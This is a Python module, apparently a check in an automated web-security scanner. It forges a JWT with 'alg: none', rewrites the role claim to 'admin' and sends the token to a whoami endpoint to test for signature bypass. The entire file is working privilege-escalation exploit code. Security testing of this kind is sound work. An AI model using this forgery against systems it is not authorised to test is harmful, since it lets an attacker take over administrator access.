import base64
import json
from ..http_engine import HTTPEngine

class JWTAttackSkill:
    def __init__(self):
        self.name = "JWT Privilege Escalation (alg:none)"

    def _base64url_encode(self, input_bytes):
        return base64.urlsafe_b64encode(input_bytes).replace(b'=', b'').decode('utf-8')

    async def run(self, base_url: str, engine: HTTPEngine, cookie_string: str = None) -> list:
        findings = []
        
        if not cookie_string or "token=" not in cookie_string:
            return findings

        token = cookie_string.split("token=")[1].split(";")[0]
        parts = token.split(".")
        if len(parts) != 3:
            return findings

        try:
            # Decode payload
            rem = len(parts[1]) % 4
            payload_b64 = parts[1] + ('=' * (4 - rem) if rem > 0 else '')
            payload = json.loads(base64.urlsafe_b64decode(payload_b64).decode())

            # Modify payload to become admin
            if "data" in payload and "role" in payload["data"]:
                payload["data"]["role"] = "admin"
            elif "role" in payload:
                payload["role"] = "admin"
            else:
                return findings # Not a standard JWT payload

            # Create the forged token
            new_header = {"alg": "none", "typ": "JWT"}
            header_b64 = self._base64url_encode(json.dumps(new_header).encode())
            payload_b64 = self._base64url_encode(json.dumps(payload).encode())
            
            # The alg:none attack has an empty signature
            forged_token = f"{header_b64}.{payload_b64}."

            # Test the forged token against a protected endpoint
            test_headers = {"Cookie": f"token={forged_token}"}
            test_url = f"{base_url.rstrip('/')}/rest/user/whoami"
            
            response = await engine.request("GET", test_url, headers=test_headers)
            
            if response and response.status_code == 200:
                if "admin" in response.text.lower():
                    poc = f"Forged JWT using alg:none\n\nNew Cookie:\ntoken={forged_token}"
                    findings.append({
                        "skill": self.name,
                        "target": test_url,
                        "issue": "JWT Signature Bypass (alg:none)",
                        "severity": "Critical",
                        "evidence": "Server accepted a forged JWT with 'alg: none' and granted admin access.",
                        "poc": poc
                    })
        except Exception:
            pass
            
        return findings
